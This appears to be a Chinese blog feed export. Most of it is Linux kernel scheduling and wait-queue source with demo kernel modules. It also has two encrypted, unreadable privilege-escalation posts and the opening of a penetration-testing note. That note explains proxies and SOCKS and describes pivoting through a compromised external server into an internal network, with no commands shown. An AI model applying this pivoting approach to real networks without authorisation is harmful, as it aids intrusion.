<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_NICE	19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_NICE	-20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NICE_WIDTH	(MAX_NICE - MIN_NICE + 1)</span></span><br></pre></td></tr></table></figure></div>

<p>nice &#x3D; static_prio-120，其范围是 -20~19，nice 值越小，优先级越高。</p>
</blockquote>
<h2 id="set-user-nice"><a href="#set-user-nice" class="headerlink" title="set_user_nice()"></a>set_user_nice()</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_user_nice</span><span class="params">(<span class="keyword">struct</span> task_struct *p, <span class="type">long</span> nice)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> queued, running;</span><br><span class="line">	<span class="type">int</span> old_prio;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rq_flags</span> <span class="title">rf</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (task_nice(p) == nice || nice &lt; MIN_NICE || nice &gt; MAX_NICE)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We have to be careful, if called from sys_setpriority(),</span></span><br><span class="line"><span class="comment">	 * the task might be in the middle of scheduling on another CPU.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	rq = task_rq_lock(p, &amp;rf);</span><br><span class="line">	update_rq_clock(rq);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The RT priorities are set via sched_setscheduler(), but we still</span></span><br><span class="line"><span class="comment">	 * allow the &#x27;normal&#x27; nice value to be set - but as expected</span></span><br><span class="line"><span class="comment">	 * it wont have any effect on scheduling until the task is</span></span><br><span class="line"><span class="comment">	 * SCHED_DEADLINE, SCHED_FIFO or SCHED_RR:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (task_has_dl_policy(p) || task_has_rt_policy(p)) &#123;</span><br><span class="line">		p-&gt;static_prio = NICE_TO_PRIO(nice);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line">	queued = task_on_rq_queued(p);</span><br><span class="line">	running = task_current(rq, p);</span><br><span class="line">	<span class="keyword">if</span> (queued)</span><br><span class="line">		dequeue_task(rq, p, DEQUEUE_SAVE | DEQUEUE_NOCLOCK);</span><br><span class="line">	<span class="keyword">if</span> (running)</span><br><span class="line">		put_prev_task(rq, p);</span><br><span class="line"></span><br><span class="line">	p-&gt;static_prio = NICE_TO_PRIO(nice);</span><br><span class="line">	set_load_weight(p, <span class="literal">true</span>);</span><br><span class="line">	old_prio = p-&gt;prio;</span><br><span class="line">	p-&gt;prio = effective_prio(p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (queued)</span><br><span class="line">		enqueue_task(rq, p, ENQUEUE_RESTORE | ENQUEUE_NOCLOCK);</span><br><span class="line">	<span class="keyword">if</span> (running)</span><br><span class="line">		set_next_task(rq, p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If the task increased its priority or is running and</span></span><br><span class="line"><span class="comment">	 * lowered its priority, then reschedule its CPU:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	p-&gt;sched_class-&gt;prio_changed(rq, p, old_prio);</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	task_rq_unlock(rq, p, &amp;rf);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(set_user_nice);</span><br></pre></td></tr></table></figure></div>

<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/pid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test_func</span><span class="params">(<span class="type">void</span>* argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;init test_func\n&quot;</span>);</span><br><span class="line">	printk(<span class="string">&quot;current static_prio ==&gt; %d\n&quot;</span>, current-&gt;static_prio);</span><br><span class="line">	printk(<span class="string">&quot;task_nice(current) ==&gt; %d\n&quot;</span>, task_nice(current));</span><br><span class="line">	printk(<span class="string">&quot;current_pid ==&gt; %d\n&quot;</span>, current-&gt;pid);</span><br><span class="line">	printk(<span class="string">&quot;exit test_func\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">test_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;init func\n&quot;</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">pts</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> iNice;</span><br><span class="line">	</span><br><span class="line">	printk(<span class="string">&quot;current-&gt;pid ==&gt; %d\n&quot;</span>, current-&gt;pid);</span><br><span class="line">	</span><br><span class="line">	pts = kthread_create_on_node(test_func,<span class="literal">NULL</span>,<span class="number">-1</span>,<span class="string">&quot;kthread_test&quot;</span>);</span><br><span class="line">	wake_up_process(pts);</span><br><span class="line">	iNice = task_nice(pts);</span><br><span class="line">	</span><br><span class="line">	printk(<span class="string">&quot;pts-&gt;pid ==&gt; %d\n&quot;</span>, pts-&gt;pid);</span><br><span class="line">	printk(<span class="string">&quot;pts-&gt;static_prio ==&gt; %d\n&quot;</span>, pts-&gt;static_prio);</span><br><span class="line">	printk(<span class="string">&quot;task_nice(pts) ==&gt; %d\n&quot;</span>, iNice);</span><br><span class="line">	printk(<span class="string">&quot;pts-&gt;prio ==&gt; %d\n&quot;</span>, pts-&gt;prio);</span><br><span class="line">	</span><br><span class="line">	set_user_nice(pts, <span class="number">-20</span>);</span><br><span class="line">	printk(<span class="string">&quot;pts-&gt;pid ==&gt; %d\n&quot;</span>, pts-&gt;pid);</span><br><span class="line">	printk(<span class="string">&quot;pts-&gt;static_prio ==&gt; %d\n&quot;</span>, pts-&gt;static_prio);</span><br><span class="line">	printk(<span class="string">&quot;task_nice(pts) ==&gt; %d\n&quot;</span>, iNice);</span><br><span class="line">	printk(<span class="string">&quot;pts-&gt;prio ==&gt; %d\n&quot;</span>, pts-&gt;prio);</span><br><span class="line">	</span><br><span class="line">	printk(<span class="string">&quot;exit func\n&quot;</span>);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">test_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;mod-kthread_test exit...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">module_init(test_init);</span><br><span class="line">module_exit(test_exit);</span><br></pre></td></tr></table></figure></div>

<h2 id="complete-all"><a href="#complete-all" class="headerlink" title="complete_all()"></a>complete_all()</h2><p>主要用于唤醒等待队列中所有睡眠进程。唤醒进程不是同步操作。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * complete_all: - signals all threads waiting on this completion</span></span><br><span class="line"><span class="comment"> * @x:  holds the state of this particular completion</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This will wake up all threads waiting on this particular completion event.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If this function wakes up a task, it executes a full memory barrier before</span></span><br><span class="line"><span class="comment"> * accessing the task state.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Since complete_all() sets the completion of @x permanently to done</span></span><br><span class="line"><span class="comment"> * to allow multiple waiters to finish, a call to reinit_completion()</span></span><br><span class="line"><span class="comment"> * must be used on @x if @x is to be used again. The code must make</span></span><br><span class="line"><span class="comment"> * sure that all waiters have woken and finished before reinitializing</span></span><br><span class="line"><span class="comment"> * @x. Also note that the function completion_done() can not be used</span></span><br><span class="line"><span class="comment"> * to know if there are still waiters after complete_all() has been called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> done;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> wait;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">complete_all</span><span class="params">(<span class="keyword">struct</span> completion *x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">	spin_lock_irqsave(&amp;x-&gt;wait.lock, flags);</span><br><span class="line">	x-&gt;done = UINT_MAX;</span><br><span class="line">	__wake_up_locked(&amp;x-&gt;wait, TASK_NORMAL, <span class="number">0</span>);</span><br><span class="line">	spin_unlock_irqrestore(&amp;x-&gt;wait.lock, flags);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(complete_all);</span><br></pre></td></tr></table></figure></div>

<h2 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/pid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">pthread</span>;</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> <span class="title">cp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test_func</span><span class="params">(<span class="type">void</span>* argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;parent thread state ==&gt; %ld\n&quot;</span>, pthread-&gt;state);</span><br><span class="line">	printk(<span class="string">&quot;parent thread pid ==&gt; %d\n&quot;</span>, pthread-&gt;pid);</span><br><span class="line">	printk(<span class="string">&quot;kthread pid ==&gt; %d\n&quot;</span>, current-&gt;pid);</span><br><span class="line">	printk(<span class="string">&quot;kthread done ==&gt; %d\n&quot;</span>,cp.done);</span><br><span class="line">	</span><br><span class="line">	complete_all(&amp;cp);</span><br><span class="line">	</span><br><span class="line">	printk(<span class="string">&quot;parent thread pid ==&gt; %d\n&quot;</span>, pthread-&gt;pid);</span><br><span class="line">	printk(<span class="string">&quot;kthread done ==&gt; %d\n&quot;</span>,cp.done);	</span><br><span class="line">	printk(<span class="string">&quot;parent thread state ==&gt; %ld\n&quot;</span>, pthread-&gt;state);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">test_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">pts</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">wait_queue_entry_t</span> data;</span><br><span class="line">	<span class="type">long</span> lefttime;</span><br><span class="line">	</span><br><span class="line">	pthread = current;</span><br><span class="line">	pts = kthread_create_on_node(test_func, <span class="literal">NULL</span>, <span class="number">-1</span>, <span class="string">&quot;kthread_test&quot;</span>);</span><br><span class="line">	wake_up_process(pts); <span class="comment">// wake the new kthread up</span></span><br><span class="line">	</span><br><span class="line">	init_completion(&amp;cp);</span><br><span class="line">	init_wait_entry(&amp;data, current);</span><br><span class="line">	add_wait_queue(&amp;(cp.wait), &amp;data);</span><br><span class="line">	</span><br><span class="line">	lefttime = schedule_timeout_uninterruptible(<span class="number">10000</span>);</span><br><span class="line">	printk(<span class="string">&quot;timeout ==&gt; %ld\n&quot;</span>, lefttime);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">test_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;mod-kthread_test exit...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">module_init(test_init);</span><br><span class="line">module_exit(test_exit);</span><br></pre></td></tr></table></figure></div>

<h2 id="wake-up-sync-key"><a href="#wake-up-sync-key" class="headerlink" title="__wake_up_sync_key()"></a>__wake_up_sync_key()</h2><p>此函数用于唤醒等待队列中处于特定状态的进程，此特定状态是此函数的第二个参数mode定义的。当进程的状态满足此特定状态时就有可能被唤醒，获得CPU资源，从而被调度执行。此函数唤醒的进程不会改变进程之前所在的CPU，不会引起额外的CPU的抢占，并且可以同步唤醒进程。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * __wake_up_sync_key - wake up threads blocked on a waitqueue.</span></span><br><span class="line"><span class="comment"> * @wq_head: the waitqueue</span></span><br><span class="line"><span class="comment"> * @mode: which threads</span></span><br><span class="line"><span class="comment"> * @key: opaque value to be passed to wakeup targets</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The sync wakeup differs that the waker knows that it will schedule</span></span><br><span class="line"><span class="comment"> * away soon, so while the target thread will be woken up, it will not</span></span><br><span class="line"><span class="comment"> * be migrated to another CPU - ie. the two threads are &#x27;synchronized&#x27;</span></span><br><span class="line"><span class="comment"> * with each other. This can prevent needless bouncing between CPUs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * On UP it can prevent extra preemption.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If this function wakes up a task, it executes a full memory barrier before</span></span><br><span class="line"><span class="comment"> * accessing the task state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __wake_up_sync_key(<span class="keyword">struct</span> wait_queue_head *wq_head, <span class="type">unsigned</span> <span class="type">int</span> mode,</span><br><span class="line">			<span class="type">void</span> *key)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!wq_head))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	__wake_up_common_lock(wq_head, mode, <span class="number">1</span>, WF_SYNC, key);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(__wake_up_sync_key);</span><br></pre></td></tr></table></figure></div>

<h2 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*头文件引用*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/pid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*全局变量定义*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">wait_queue_head_t</span> head;  <span class="comment">//等待队列头元素</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">old_thread</span>;</span> <span class="comment">//保存进程描述符信息</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_function</span><span class="params">(<span class="type">void</span> * argc)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;in the kernel thread function! \n&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;the current pid is:%d\n&quot;</span>, current-&gt;pid);    <span class="comment">//显示当前进程的PID值</span></span><br><span class="line">    <span class="comment">/*显示父进程的状态*/</span></span><br><span class="line">    printk(<span class="string">&quot;the state of the init funcation is :%ld\n&quot;</span>, old_thread-&gt;state);</span><br><span class="line">    __wake_up_sync(&amp;head, TASK_NEW,<span class="number">0</span>);                     <span class="comment">//调用函数唤醒等待队列中的进程</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示函数调用之后的父进程的状态</span></span><br><span class="line">    printk(<span class="string">&quot;the state of the init function after __wake_up_sync is :%ld\n&quot;</span>, old_thread-&gt;state);</span><br><span class="line">    printk(<span class="string">&quot;out the kernel thread function\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init __wake_up_sync_init(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> namefrm[]=<span class="string">&quot;__wake_up_sync.c%s&quot;</span>;            <span class="comment">//线程的输出类型名，在此程序中无影响</span></span><br><span class="line">    <span class="type">long</span> time_out; <span class="comment">//保存schedule_timeout_uninterruptible( )的返回结果</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">result</span>;</span>                   <span class="comment">//保存新进程的信息</span></span><br><span class="line">    <span class="type">wait_queue_t</span> data;                              <span class="comment">//等待队列元素</span></span><br><span class="line">    printk(<span class="string">&quot;into __wake_up_sync_init.\n&quot;</span>);</span><br><span class="line">    result=kthread_create_on_node(my_function, <span class="literal">NULL</span>, <span class="number">-1</span>, namefrm); <span class="comment">// 创建新进程</span></span><br><span class="line">    printk(<span class="string">&quot;the pid of the new thread is:%d\n&quot;</span>, result-&gt;pid);    <span class="comment">//显示新线程的PID值</span></span><br><span class="line">    printk(<span class="string">&quot;the current pid is:%d\n&quot;</span>, current-&gt;pid);     <span class="comment">//显示当前进程的PID值</span></span><br><span class="line"></span><br><span class="line">    init_waitqueue_head(&amp;head);                     <span class="comment">//初始化等待队列头元素</span></span><br><span class="line">    init_waitqueue_entry(&amp;data, current);           <span class="comment">//用当前进程初始化等待队列中的一个元素</span></span><br><span class="line">    add_wait_queue(&amp;head, &amp;data);                   <span class="comment">//将等待队列元素加入等待队列中</span></span><br><span class="line">    old_thread=current;                             <span class="comment">//记录当前进程的信息</span></span><br><span class="line">    wake_up_process(result);                        <span class="comment">//唤醒新创建的线程</span></span><br><span class="line">    time_out=schedule_timeout_uninterruptible(<span class="number">1000</span>*<span class="number">10</span>); <span class="comment">//让当前进程进入睡眠状态，可以改小一点</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出schedule_timeout_uninterruptible( )返回结果</span></span><br><span class="line">    printk(<span class="string">&quot;the schedule timeout is:%ld\n&quot;</span>, time_out);</span><br><span class="line">    printk(<span class="string">&quot;out __wake_up_sync_init.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit __wake_up_sync_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Goodbye __wake_up_sync\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(__wake_up_sync_init);</span><br><span class="line">module_exit(__wake_up_sync_exit);</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>Linux_kernel进程</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核分析之内存管理</title>
    <url>/2024/01/25/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="5d245aa65c11b55e5c467e8960dd90db721847534da3e499deb7a772264680a8">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f63d377bd2010242d2a14038faad07cc258f714db83eb0d64758b056a5b6397d79e183ca5ac1c4ac1322a867290caf7921452826bcc414ec85db4892729c1bd6e22e091628ba9ec5e253ff6d7420e2c86eb91477958bf961eb91cd25b6bb10227096093286f9968342177e6cf4fb8d4be51f0bd62c65090608d3a53925af7bf1d3eb398a6ed624f38361aacf0cd7bc11a1785597cce26717eafd70b1cc9ba3c4f32ca31fb1bc7e624add19dad7ebb993709</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>Linux_kernel的内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之Linux权限提升与权限维持</title>
    <url>/2024/01/23/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8BLinux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux提权与维持</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之Windows权限提升与权限维持</title>
    <url>/2024/01/23/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8BWindows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Windows提权与维持</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之内网穿透</title>
    <url>/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h1 id="内⽹穿透"><a href="#内⽹穿透" class="headerlink" title="内⽹穿透"></a>内⽹穿透</h1><p>内⽹穿透，也即 NAT 穿透，进⾏ NAT 穿透是为了使具有某⼀个特定源 IP 地址和源端⼝号的数据包不被 NAT 设备屏蔽⽽正确路由到内⽹主机。</p>
<h2 id="代理概述"><a href="#代理概述" class="headerlink" title="代理概述"></a>代理概述</h2><p>代理其实就是⼀个中介，A和B本来可以直连，中间插⼊⼀个C，C就是中介，比如<code>Brupsuite</code>。</p>
<h3 id="Socks协议"><a href="#Socks协议" class="headerlink" title="Socks协议"></a>Socks协议</h3><p>中⽂意思：防⽕墙安全会话转换协议，⼯作在OSI参考模型的第5层（会话层）。<br>它是⼀种可以穿透防⽕墙的协议，因为Socks介于传输层与表示层之间，使⽤TCP协议传输数据，因⽽不提供如传递ICMP信息之类的⽹络层相关服务。Socks不⽀持ICMP，不能使⽤ping命令。</p>
<h3 id="正向代理简介"><a href="#正向代理简介" class="headerlink" title="正向代理简介"></a>正向代理简介</h3><p>正向代理类似⼀个跳板机，代理访问外部资源⽐如我们国内访问⾕歌，直接访问访问不到，我们可以通过⼀个正向代理服务器，请求发到代理服，代理服务器能够访问⾕歌，这样由代理去⾕歌取到返回数据，再返回给我们，这样我们就能访问⾕歌了。</p>
<h3 id="反向代理简介"><a href="#反向代理简介" class="headerlink" title="反向代理简介"></a>反向代理简介</h3><p>刚开始的时候，代理多数是帮助内⽹client访问外⽹server⽤的。后来出现了反向代理，反向其实是指⽅向相反，即代理将来⾃外⽹客户端的请求转发到内⽹服务器，从外到内。反向代理实际运⾏⽅式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部⽹络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为⼀个服务器。</p>
<h3 id="代理的意义"><a href="#代理的意义" class="headerlink" title="代理的意义"></a>代理的意义</h3><p>我们在获得外⽹服务器的⼀定权限后发现这台服务器可以直接或者间接的访问内⽹ ，此时渗透测试进⼊后渗透阶段，⼀般情况下，内⽹中的其他机器是不允许来⾃外⽹机器的访问的。这时候，我们可以将这台外⽹服务器设置成为代理，使得我们⾃⼰的攻击机可以直接访问与操作内⽹中其他机器。按照代理协议在TCP&#x2F;IP协议栈中所处的位置，可以将正向代理分为HTTP代理和socks代理。HTTP代理技术要求所有代理流量按照HTTP协议进⾏传输，使⽤socks代理技术则可以在直接在⽹络层传输代理数据包。HTTP代理⼯作在应⽤层，socks代理⼯作在⽹络层，所以socks代理技术⽐HTTP代理快很多。</p>
